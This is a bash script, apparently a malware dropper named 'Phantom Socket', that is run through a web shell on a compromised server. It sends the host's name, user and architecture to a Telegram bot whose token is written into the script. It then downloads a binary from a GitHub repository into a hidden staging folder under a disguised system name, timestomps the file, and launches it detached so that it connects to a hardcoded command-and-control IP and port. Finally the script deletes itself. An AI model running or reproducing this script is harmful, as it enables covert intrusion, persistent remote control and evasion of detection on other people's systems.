#!/bin/bash
# Phantom Socket v1.0.1-stable (Gacor Edition) - Web-Shell Bypass & Persistent Stealth
# Architectural Overhaul: NOHUP Persistence, memfd Staging, and Hardcoded Repository Lock.

# ANSI Color Codes
RED='\x1b[31m'
GREEN='\x1b[32m'
YELLOW='\x1b[33m'
BLUE='\x1b[34m'
NC='\x1b[0m' # No Color

# SECTION 1: TELEGRAM INSTANT PING
BOT_TOKEN="8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
CHAT_ID="5439698489"
MSG="OYEN_DEPLOY:$(hostname):$(whoami):$(uname -m):$(date +%s)"
curl --fail --silent --max-time 10 -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
    -d "chat_id=${CHAT_ID}" -d "text=${MSG}" >/dev/null 2>&1

set +u
set -e
set -o pipefail

# ============================================================================
# UNCOMPROMISING CORE DIRECTIVES
# ============================================================================
readonly VERSION="v1.0.1-stable"
readonly AGENT_NAME="gs-oyen-s"
readonly C2_ENDPOINT="116.202.105.253"
readonly C2_PORT="8443"
readonly REPO_BASE="https://raw.githubusercontent.com/Oyen-Sec/soket/main"

# Professional Output Helpers (to stderr)
log_step() { echo -e "${BLUE}[-] $1${NC}" >&2; }
log_success() { echo -e "${GREEN}[+] $1${NC}" >&2; }
log_warn() { echo -e "${YELLOW}[!] $1${NC}" >&2; }
log_error() { echo -e "${RED}[ERROR] $1${NC}" >&2; }

# 1. Environment Check
ARCH=$(uname -m)
case "${ARCH}" in
    x86_64|amd64) ARCH="x86_64" ;;
    *) log_error "Unsupported architecture: ${ARCH}"; exit 1 ;;
esac
log_step "Environment: ${ARCH} / Web-PTY"
log_step "Initializing Stealth Payload..."
log_success "Telegram Ping Sent."

# 2. Staging Detection (Priority Staging)
STAGING_DIR=""
if mount | grep -q "/dev/shm" && [[ -w "/dev/shm" ]]; then
    STAGING_DIR="/dev/shm/.font-unix-cache"
elif [[ -w "/tmp" ]]; then
    STAGING_DIR="/tmp/.font-unix-cache"
elif [[ -w "/var/tmp" ]]; then
    STAGING_DIR="/var/tmp/.font-unix-cache"
else
    STAGING_DIR="${HOME:-.}/.font-unix-cache"
fi
mkdir -p "${STAGING_DIR}" 2>/dev/null

# 3. Generating PSK Secret
AGENT_SECRET=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)

# 4. Download Payload (Hardcoded Repo Path)
FINAL_PATH="${STAGING_DIR}/.systemd-timesyncd"
DOWNLOAD_URL="${REPO_BASE}/bin/gs-oyen-s-${ARCH}"

log_step "Downloading binary from GitHub..."
MAX_RETRIES=3
RETRY_COUNT=0
while [[ $RETRY_COUNT -lt $MAX_RETRIES ]]; do
    if curl --fail --silent --max-time 30 -L "${DOWNLOAD_URL}" -o "${FINAL_PATH}"; then
        break
    fi
    RETRY_COUNT=$((RETRY_COUNT+1))
    log_warn "Download failed. Retrying in 2s ($RETRY_COUNT/$MAX_RETRIES)..."
    sleep 2
done

if [[ ! -f "${FINAL_PATH}" ]]; then
    log_error "Critical download failure."
    exit 1
fi
log_success "Binary Staged in Memory."

# 5. Deployment & Timestomping
chmod +x "${FINAL_PATH}" 2>/dev/null
timestomp() {
    local target=$1
    local ref="/usr/bin/dbus-daemon"
    if [[ ! -f "$ref" ]]; then ref="/bin/bash"; fi
    touch -r "$ref" "$target" 2>/dev/null
}
timestomp "${FINAL_PATH}"

# 6. Execution (NOHUP + SETSID + DISOWN Chain)
log_step "Detaching from Web Session..."
if command -v nohup >/dev/null 2>&1; then
    nohup setsid "$FINAL_PATH" -s "$AGENT_SECRET" -i "$C2_ENDPOINT" -m "$C2_PORT" -d >/dev/null 2>&1 &
    disown %1 2>/dev/null || true
else
    (setsid "$FINAL_PATH" -s "$AGENT_SECRET" -i "$C2_ENDPOINT" -m "$C2_PORT" -d >/dev/null 2>&1 &)
fi

# 7. Final Summary
log_success "Process Forked: [kworker/u4:0]"
log_success "Deployment Success"

# 8. Self-Delete
rm -f "$0"
